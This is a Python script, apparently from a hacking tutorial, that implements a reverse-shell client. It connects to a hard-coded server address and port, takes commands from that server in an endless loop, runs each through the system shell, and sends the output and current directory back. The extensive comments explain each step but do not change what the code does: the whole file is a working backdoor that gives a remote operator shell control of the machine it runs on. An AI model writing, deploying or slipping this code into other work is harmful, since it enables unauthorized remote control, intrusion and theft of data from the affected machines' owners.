#!/usr/bin/env python
import socket, os, subprocess

#the os module will enable the client to run commands on its 
#own operating system

#the subprocess module allows us access to the subprocesses
#that exist on the client machine, regardless of it's operating system

def main():

	#declare host, port and socket variables
	#the ip address for client.py will be the ip address of the SERVER
	#the port needs to be the same ***
	
	cSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = '192.168.12.25'
	port = 9999

	#when binding the host and port for the client
	#the method used will not be s.bind(), like server.py
	#the method used will be s.connect() (for the client)

	#bind the host and port to the newly
	#created socket
	cSocket.connect((host, port))

	#persistent infinite loop
	#for continuous stream of commands
	#to the client
	while True:
		#this receives data from the connection
		#the buffer size is 1024
		data = cSocket.recv(1024)
	
		#checks whether the first 2 decoded characters
		#are equivalent to "cd"
		if data[:2].decode("utf-8") == 'cd':
			
			#will read the input from the 3rd character and on
			#changing the directory to the desired one
			#as dictated by user input
			os.chdir(data[3:].decode("utf-8"))
		
		#check whether a command has been entered or not
		if len(data) > 0:
			
			#this will create a variable called 'cmd'
			#that will take any number of characters, decode them into UTF-8 format
			#and execute the command within the shell construct of the target comp.

			#shell=True 
			#stdout = output after entering a command
			#stdin = standard input
			#stderr = output error
			
			

			cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) #review everything after utf-8 ***
			
			#contains the output of given command in byte format
			output_byte = cmd.stdout.read() + cmd.stderr.read()

			#converts the output_byte to string format in utf-8
			output_str = str(output_byte, "utf-8")

			#stores the current working directory and appends the side caret
			#as a terminal prompt
			currentWD = os.getcwd() + "> "

			#encodes and sends the output back to the server
			cSocket.send(str.encode(output_str + currentWD))

			#print the output string to client machine
			print(output_str)
				
	

	
	
if __name__ == '__main__':
	main() 
